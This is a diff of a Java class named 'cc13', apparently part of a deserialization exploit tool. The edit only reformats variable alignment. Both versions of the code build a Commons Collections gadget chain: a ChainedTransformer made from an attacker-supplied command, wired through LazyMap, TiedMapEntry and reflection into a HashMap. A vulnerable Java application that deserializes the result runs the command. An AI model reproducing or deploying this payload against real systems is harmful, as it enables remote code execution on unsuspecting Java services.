@@ -19,11 +19,11 @@ import java.util.Map;
 public class cc13 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
-        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
-        Transformer         transformerChain = new ChainedTransformer(transformers);
-        Map                 decorate         = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
-        TiedMapEntry        tiedMapEntry     = new TiedMapEntry(decorate, 1);
-        HashMap             hashMap          = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, 1);
+        HashMap hashMap = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);
 
         Reflections.setFieldValue(decorate, "factory", transformerChain);
         Reflections.setFieldValue(tiedMapEntry, "key", 233);
